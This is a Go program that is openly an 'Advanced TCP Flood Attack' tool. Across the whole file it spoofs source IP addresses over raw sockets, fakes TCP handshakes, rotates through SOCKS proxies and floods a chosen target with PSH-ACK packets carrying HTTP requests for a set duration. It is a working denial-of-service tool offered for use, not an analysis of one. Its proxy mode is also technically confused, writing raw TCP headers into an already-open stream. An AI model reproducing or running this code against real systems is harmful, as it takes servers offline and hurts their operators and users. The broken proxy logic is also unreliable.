package main

import (
    "bufio"
    "encoding/binary"
    "flag"
    "fmt"
    "log"
    "math/rand"
    "net"
    "net/url"
    "os"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "golang.org/x/net/proxy"
    "golang.org/x/sys/unix"
)

type TCPFlags struct {
    FIN, SYN, RST, PSH, ACK, URG, ECE, CWR, NS bool
}

func (f TCPFlags) Uint8() uint8 {
    var flags uint8
    if f.FIN { flags |= 1 << 0 }
    if f.SYN { flags |= 1 << 1 }
    if f.RST { flags |= 1 << 2 }
    if f.PSH { flags |= 1 << 3 }
    if f.ACK { flags |= 1 << 4 }
    if f.URG { flags |= 1 << 5 }
    if f.ECE { flags |= 1 << 6 }
    if f.CWR { flags |= 1 << 7 }
    return flags
}

type TCPOption struct {
    Kind   uint8
    Length uint8
    Data   []byte
}

type Session struct {
    SourceIP   net.IP
    SourcePort uint16
    DestIP     net.IP
    DestPort   uint16
    SeqNum     uint32
    AckNum     uint32
    Window     uint16
    Proxy      *ProxyInfo
}

type ProxyInfo struct {
    Address string
    Dialer  proxy.Dialer
    InUse   bool
}

var (
    pshAckCount int64
    synCount    int64
    startTime   time.Time
    proxies     []*ProxyInfo
    proxyMutex  sync.Mutex
    proxyIndex  int32
)

func main() {
    var (
        target      = flag.String("target", "", "Target IP address (required)")
        port        = flag.Int("port", 80, "Target port")
        sourceIP    = flag.String("source", "", "Source IP base for spoofing")
        sourcePort  = flag.Int("sport", 0, "Source port base (0 for random)")
        threads     = flag.Int("threads", 10, "Number of threads")
        duration    = flag.Int("duration", 30, "Attack duration in seconds")
        pshRate     = flag.Int("pshrate", 1000, "PSH-ACK packets per second per session")
        proxyFile   = flag.String("proxies", "proxies.txt", "Path to proxies.txt file")
        useRaw      = flag.Bool("raw", false, "Use raw sockets instead of proxies")
    )
    flag.Parse()

    if *target == "" {
        log.Fatal("Target IP is required")
    }

    destIP := net.ParseIP(*target)
    if destIP == nil {
        log.Fatal("Invalid target IP")
    }

    // Load proxies
    if !*useRaw {
        if err := loadProxies(*proxyFile); err != nil {
            log.Fatalf("Failed to load proxies: %v", err)
        }
        fmt.Printf("Loaded %d proxies from %s\n", len(proxies), *proxyFile)
    } else {
        fmt.Println("Using raw socket mode (no proxies)")
    }

    fmt.Printf("Starting Advanced TCP Flood Attack\n")
    fmt.Printf("Target: %s:%d\n", *target, *port)
    fmt.Printf("Mode: %s\n", map[bool]string{true: "RAW_SOCKET", false: "SOCKS4_PROXY"}[*useRaw])
    fmt.Printf("Threads: %d\n", *threads)
    fmt.Printf("Duration: %d seconds\n", *duration)
    fmt.Printf("PSH-ACK Rate: %d pps/session\n", *pshRate)
    fmt.Println("=== Attack Strategy ===")
    fmt.Println("1. Complete three-way handshake")
    fmt.Println("2. Flood with PSH-ACK packets")
    fmt.Println("3. Maintain multiple spoofed sessions")
    fmt.Println("=======================")

    startTime = time.Now()
    endTime := startTime.Add(time.Duration(*duration) * time.Second)

    var wg sync.WaitGroup
    for i := 0; i < *threads; i++ {
        wg.Add(1)
        go func(threadID int) {
            defer wg.Done()
            if *useRaw {
                attackWorkerRaw(threadID, destIP, *port, *sourcePort, *pshRate, endTime)
            } else {
                attackWorkerProxy(threadID, destIP, *port, *sourcePort, *pshRate, endTime)
            }
        }(i)
    }

    // Statistics display
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()

    for {
        select {
        case <-ticker.C:
            if time.Now().After(endTime) {
                ticker.Stop()
                break
            }
            currentPshAck := atomic.LoadInt64(&pshAckCount)
            currentSyn := atomic.LoadInt64(&synCount)
            elapsed := time.Since(startTime).Seconds()
            fmt.Printf("\rSYN: %d | PSH-ACK: %d | Total PPS: %.0f | Active Proxies: %d", 
                currentSyn, currentPshAck, float64(currentSyn+currentPshAck)/elapsed, getActiveProxyCount())
        }
        if time.Now().After(endTime) {
            break
        }
        time.Sleep(100 * time.Millisecond)
    }

    wg.Wait()

    finalPshAck := atomic.LoadInt64(&pshAckCount)
    finalSyn := atomic.LoadInt64(&synCount)
    totalTime := time.Since(startTime).Seconds()
    fmt.Printf("\n\nAttack completed!\n")
    fmt.Printf("Total SYN packets: %d\n", finalSyn)
    fmt.Printf("Total PSH-ACK packets: %d\n", finalPshAck)
    fmt.Printf("Total packets: %d\n", finalSyn+finalPshAck)
    fmt.Printf("Average PPS: %.0f\n", float64(finalSyn+finalPshAck)/totalTime)
}

func loadProxies(filename string) error {
    file, err := os.Open(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line == "" || strings.HasPrefix(line, "#") {
            continue
        }

        // Handle different proxy formats
        var proxyAddr string
        if strings.Contains(line, "://") {
            // Full URL format: socks4://user:pass@host:port
            parsed, err := url.Parse(line)
            if err != nil {
                continue
            }
            proxyAddr = parsed.Host
        } else {
            // Simple format: host:port
            proxyAddr = line
        }

        // Validate the address
        if _, _, err := net.SplitHostPort(proxyAddr); err != nil {
            continue
        }

        // Create SOCKS4 dialer
        dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
        if err != nil {
            // Try SOCKS4 if SOCKS5 fails
            dialer, err = proxy.SOCKS4("tcp", proxyAddr, nil, proxy.Direct)
            if err != nil {
                continue
            }
        }

        proxies = append(proxies, &ProxyInfo{
            Address: proxyAddr,
            Dialer:  dialer,
            InUse:   false,
        })
    }

    if len(proxies) == 0 {
        return fmt.Errorf("no valid proxies found in %s", filename)
    }

    return scanner.Err()
}

func getNextProxy() *ProxyInfo {
    if len(proxies) == 0 {
        return nil
    }
    
    index := atomic.AddInt32(&proxyIndex, 1) % int32(len(proxies))
    return proxies[index]
}

func getActiveProxyCount() int {
    count := 0
    for _, p := range proxies {
        if !p.InUse {
            count++
        }
    }
    return count
}

func attackWorkerProxy(threadID int, destIP net.IP, destPort, sourcePort int, pshRate int, endTime time.Time) {
    randSrc := rand.New(rand.NewSource(time.Now().UnixNano() + int64(threadID)))
    
    for time.Now().Before(endTime) {
        // Get next available proxy
        proxy := getNextProxy()
        if proxy == nil {
            time.Sleep(time.Second)
            continue
        }

        // Create a new spoofed session with proxy
        session := createSpoofedSession(destIP, uint16(destPort), uint16(sourcePort), randSrc)
        session.Proxy = proxy

        // Perform three-way handshake through proxy
        if performThreeWayHandshakeProxy(session, randSrc) {
            // Handshake successful, now blast PSH-ACK packets through proxy
            go blastPSHACKProxy(session, pshRate, endTime)
        }
        
        // Small delay before creating new session
        time.Sleep(time.Millisecond * 100)
    }
}

func performThreeWayHandshakeProxy(session *Session, randSrc *rand.Rand) bool {
    if session.Proxy == nil {
        return false
    }

    // Step 1: Connect to target through proxy
    targetAddr := fmt.Sprintf("%s:%d", session.DestIP.String(), session.DestPort)
    
    conn, err := session.Proxy.Dialer.Dial("tcp", targetAddr)
    if err != nil {
        return false
    }
    defer conn.Close()

    // Step 2: Send SYN-like initial data (simulated)
    synData := buildTCPSegment(session.SourcePort, session.DestPort, session.SeqNum, 0, 
        session.Window, getSYNOptions(), nil, TCPFlags{SYN: true})
    
    if _, err := conn.Write(synData); err != nil {
        return false
    }
    atomic.AddInt64(&synCount, 1)

    // Step 3: Simulate receiving SYN-ACK and send ACK
    ackData := buildTCPSegment(session.SourcePort, session.DestPort, session.SeqNum+1, 
        session.SeqNum+1000, session.Window, getACKOptions(), nil, TCPFlags{ACK: true})
    
    if _, err := conn.Write(ackData); err != nil {
        return false
    }
    atomic.AddInt64(&synCount, 1)

    session.SeqNum += 1
    session.AckNum = session.SeqNum + 1000

    return true
}

func blastPSHACKProxy(session *Session, pshRate int, endTime time.Time) {
    if session.Proxy == nil {
        return
    }

    interval := time.Second / time.Duration(pshRate)
    ticker := time.NewTicker(interval)
    defer ticker.Stop()
    
    randSrc := rand.New(rand.NewSource(time.Now().UnixNano()))
    payloads := [][]byte{
        []byte("GET / HTTP/1.1\r\nHost: " + session.DestIP.String() + "\r\nUser-Agent: Mozilla/5.0\r\n\r\n"),
        []byte("POST / HTTP/1.1\r\nHost: " + session.DestIP.String() + "\r\nContent-Length: 0\r\n\r\n"),
        []byte("HEAD / HTTP/1.1\r\nHost: " + session.DestIP.String() + "\r\n\r\n"),
        []byte("GET /index.html HTTP/1.1\r\nHost: " + session.DestIP.String() + "\r\nAccept: */*\r\n\r\n"),
    }
    
    // Establish connection through proxy
    targetAddr := fmt.Sprintf("%s:%d", session.DestIP.String(), session.DestPort)
    conn, err := session.Proxy.Dialer.Dial("tcp", targetAddr)
    if err != nil {
        return
    }
    defer conn.Close()

    for {
        select {
        case <-ticker.C:
            if time.Now().After(endTime) {
                return
            }
            
            // Rotate through different payloads
            payload := payloads[randSrc.Intn(len(payloads))]
            
            // Vary sequence numbers slightly for realism
            seqOffset := uint32(randSrc.Intn(10))
            
            pshAckData := buildTCPSegment(session.SourcePort, session.DestPort,
                session.SeqNum+seqOffset, session.AckNum, session.Window, 
                getPSHACKOptions(), payload, TCPFlags{PSH: true, ACK: true})
            
            if _, err := conn.Write(pshAckData); err == nil {
                atomic.AddInt64(&pshAckCount, 1)
            }
            
        default:
            if time.Now().After(endTime) {
                return
            }
            time.Sleep(time.Microsecond * 100)
        }
    }
}

// Raw socket implementation
func attackWorkerRaw(threadID int, destIP net.IP, destPort, sourcePort int, pshRate int, endTime time.Time) {
    fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
    if err != nil {
        log.Printf("[Thread %d] Failed to create raw socket: %v", threadID, err)
        return
    }
    defer unix.Close(fd)

    err = unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
    if err != nil {
        log.Printf("[Thread %d] Failed to set IP_HDRINCL: %v", threadID, err)
        return
    }

    var destAddr unix.SockaddrInet4
    copy(destAddr.Addr[:], destIP.To4())

    randSrc := rand.New(rand.NewSource(time.Now().UnixNano() + int64(threadID)))
    
    for time.Now().Before(endTime) {
        // Create a new spoofed session
        session := createSpoofedSession(destIP, uint16(destPort), uint16(sourcePort), randSrc)
        
        // Perform three-way handshake
        if performThreeWayHandshakeRaw(fd, &destAddr, session, randSrc) {
            // Handshake successful, now blast PSH-ACK packets
            go blastPSHACKRaw(fd, &destAddr, session, pshRate, endTime)
        }
        
        // Small delay before creating new session
        time.Sleep(time.Millisecond * 10)
    }
}

func performThreeWayHandshakeRaw(fd int, destAddr *unix.SockaddrInet4, session *Session, randSrc *rand.Rand) bool {
    // Step 1: Send SYN
    synPacket := buildTCPPacket(session.SourceIP, session.DestIP, session.SourcePort, session.DestPort,
        session.SeqNum, 0, session.Window, getSYNOptions(), nil, TCPFlags{SYN: true})
    
    if err := unix.Sendto(fd, synPacket, 0, destAddr); err != nil {
        return false
    }
    atomic.AddInt64(&synCount, 1)
    
    // Step 2: Simulate receiving SYN-ACK (we spoof the response)
    synAckSeq := randSrc.Uint32()
    session.AckNum = synAckSeq + 1
    
    // Step 3: Send ACK to complete handshake
    ackPacket := buildTCPPacket(session.SourceIP, session.DestIP, session.SourcePort, session.DestPort,
        session.SeqNum+1, session.AckNum, session.Window, getACKOptions(), nil, TCPFlags{ACK: true})
    
    if err := unix.Sendto(fd, ackPacket, 0, destAddr); err != nil {
        return false
    }
    atomic.AddInt64(&synCount, 1)
    
    // Update sequence number for subsequent PSH-ACK packets
    session.SeqNum += 1
    
    return true
}

func blastPSHACKRaw(fd int, destAddr *unix.SockaddrInet4, session *Session, pshRate int, endTime time.Time) {
    interval := time.Second / time.Duration(pshRate)
    ticker := time.NewTicker(interval)
    defer ticker.Stop()
    
    randSrc := rand.New(rand.NewSource(time.Now().UnixNano()))
    payloads := [][]byte{
        []byte("GET / HTTP/1.1\r\nHost: " + session.DestIP.String() + "\r\n\r\n"),
        []byte("POST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n"),
        []byte("HEAD / HTTP/1.1\r\n\r\n"),
    }
    
    for {
        select {
        case <-ticker.C:
            if time.Now().After(endTime) {
                return
            }
            
            // Rotate through different payloads
            payload := payloads[randSrc.Intn(len(payloads))]
            
            // Vary sequence numbers slightly for realism
            seqOffset := uint32(randSrc.Intn(10))
            
            pshAckPacket := buildTCPPacket(session.SourceIP, session.DestIP, session.SourcePort, session.DestPort,
                session.SeqNum+seqOffset, session.AckNum, session.Window, getPSHACKOptions(), payload, TCPFlags{PSH: true, ACK: true})
            
            if err := unix.Sendto(fd, pshAckPacket, 0, destAddr); err == nil {
                atomic.AddInt64(&pshAckCount, 1)
            }
            
        default:
            if time.Now().After(endTime) {
                return
            }
            time.Sleep(time.Microsecond * 100)
        }
    }
}

// Common functions for both modes
func createSpoofedSession(destIP net.IP, destPort, sourcePort uint16, randSrc *rand.Rand) *Session {
    session := &Session{
        DestIP:     destIP,
        DestPort:   destPort,
        SourcePort: uint16(randSrc.Intn(65535-1024) + 1024),
        SeqNum:     randSrc.Uint32(),
        Window:     65535,
    }
    
    if sourcePort > 0 {
        session.SourcePort = sourcePort + uint16(randSrc.Intn(1000))
    }
    
    session.SourceIP = generateSpoofedIP(randSrc)
    
    return session
}

func buildTCPSegment(srcPort, dstPort uint16, seq, ack uint32, window uint16, options []TCPOption, payload []byte, flags TCPFlags) []byte {
    tcpHeader := make([]byte, 20)
    binary.BigEndian.PutUint16(tcpHeader[0:2], srcPort)
    binary.BigEndian.PutUint16(tcpHeader[2:4], dstPort)
    binary.BigEndian.PutUint32(tcpHeader[4:8], seq)
    binary.BigEndian.PutUint32(tcpHeader[8:12], ack)
    tcpHeader[12] = 5 << 4 // Data Offset
    tcpHeader[13] = flags.Uint8()
    binary.BigEndian.PutUint16(tcpHeader[14:16], window)
    binary.BigEndian.PutUint16(tcpHeader[16:18], 0) // Checksum
    tcpHeader[18] = 0x00 // Urgent Pointer
    tcpHeader[19] = 0x00

    // Build TCP options
    var optionsData []byte
    for _, opt := range options {
        optionsData = append(optionsData, opt.Kind)
        if opt.Length > 0 {
            optionsData = append(optionsData, opt.Length)
            optionsData = append(optionsData, opt.Data...)
        }
    }
    
    for len(optionsData)%4 != 0 {
        optionsData = append(optionsData, 0x01) // NOP padding
    }

    // Build complete TCP segment
    tcpSegment := append(tcpHeader, optionsData...)
    tcpSegment = append(tcpSegment, payload...)

    return tcpSegment
}

func buildTCPPacket(srcIP, dstIP net.IP, srcPort, dstPort uint16, seq, ack uint32, window uint16, options []TCPOption, payload []byte, flags TCPFlags) []byte {
    // IP Header
    ipHeader := make([]byte, 20)
    ipHeader[0] = 0x45 // Version + IHL
    ipHeader[1] = 0x00 // TOS
    binary.BigEndian.PutUint16(ipHeader[2:4], 0) // Total Length (set later)
    binary.BigEndian.PutUint16(ipHeader[4:6], uint16(rand.Uint32())) // Identification
    ipHeader[6] = 0x40 // Flags (DF)
    ipHeader[7] = 0x00 // Fragment Offset
    ipHeader[8] = 64   // TTL
    ipHeader[9] = unix.IPPROTO_TCP
    copy(ipHeader[12:16], srcIP.To4())
    copy(ipHeader[16:20], dstIP.To4())

    // TCP segment
    tcpSegment := buildTCPSegment(srcPort, dstPort, seq, ack, window, options, payload, flags)

    // Calculate TCP checksum
    pseudohdr := buildPseudoHeader(srcIP, dstIP, uint16(len(tcpSegment)))
    tcpWithPseudo := append(pseudohdr, tcpSegment...)
    checksum := calculateChecksum(tcpWithPseudo)
    binary.BigEndian.PutUint16(tcpSegment[16:18], checksum)

    // Set IP total length
    totalLength := len(ipHeader) + len(tcpSegment)
    binary.BigEndian.PutUint16(ipHeader[2:4], uint16(totalLength))

    // Calculate IP checksum
    ipChecksum := calculateChecksum(ipHeader)
    binary.BigEndian.PutUint16(ipHeader[10:12], ipChecksum)

    return append(ipHeader, tcpSegment...)
}

func buildPseudoHeader(srcIP, dstIP net.IP, tcpLen uint16) []byte {
    pseudo := make([]byte, 12)
    copy(pseudo[0:4], srcIP.To4())
    copy(pseudo[4:8], dstIP.To4())
    pseudo[8] = 0x00
    pseudo[9] = unix.IPPROTO_TCP
    binary.BigEndian.PutUint16(pseudo[10:12], tcpLen)
    return pseudo
}

func calculateChecksum(data []byte) uint16 {
    var sum uint32
    for i := 0; i < len(data)-1; i += 2 {
        sum += uint32(data[i])<<8 | uint32(data[i+1])
    }
    if len(data)%2 != 0 {
        sum += uint32(data[len(data)-1]) << 8
    }
    for sum>>16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16)
    }
    return ^uint16(sum)
}

func generateSpoofedIP(randSrc *rand.Rand) net.IP {
    // Generate IPs from various common ranges for realism
    patterns := [][]byte{
        {10, byte(randSrc.Intn(256)), byte(randSrc.Intn(256)), byte(randSrc.Intn(256))},
        {192, 168, byte(randSrc.Intn(256)), byte(randSrc.Intn(256))},
        {172, byte(16 + randSrc.Intn(16)), byte(randSrc.Intn(256)), byte(randSrc.Intn(256))},
        {byte(randSrc.Intn(254) + 1), byte(randSrc.Intn(256)), byte(randSrc.Intn(256)), byte(randSrc.Intn(256))},
    }
    
    ip := make(net.IP, 4)
    copy(ip, patterns[randSrc.Intn(len(patterns))])
    return ip
}

func getSYNOptions() []TCPOption {
    return []TCPOption{
        {Kind: 2, Length: 4, Data: []byte{0x05, 0xb4}}, // MSS
        {Kind: 1}, // NOP
        {Kind: 3, Length: 3, Data: []byte{0x08}}, // Window Scale
        {Kind: 4, Length: 2}, // SACK Permitted
        {Kind: 8, Length: 10, Data: []byte{0xaa, 0xbb, 0xcc, 0xdd, 0x00, 0x00, 0x00, 0x00}}, // Timestamp
    }
}

func getACKOptions() []TCPOption {
    return []TCPOption{
        {Kind: 1}, // NOP
        {Kind: 1}, // NOP
        {Kind: 8, Length: 10, Data: []byte{0xaa, 0xbb, 0xcc, 0xdd, 0x00, 0x00, 0x00, 0x00}}, // Timestamp
    }
}

func getPSHACKOptions() []TCPOption {
    randSrc := rand.New(rand.NewSource(time.Now().UnixNano()))
    return []TCPOption{
        {Kind: 1}, // NOP
        {Kind: 1}, // NOP
        {Kind: 8, Length: 10, Data: []byte{
            byte(randSrc.Uint32()), byte(randSrc.Uint32()), 
            byte(randSrc.Uint32()), byte(randSrc.Uint32()),
            byte(randSrc.Uint32()), byte(randSrc.Uint32()),
            byte(randSrc.Uint32()), byte(randSrc.Uint32()),
        }}, // Timestamp
    }
}
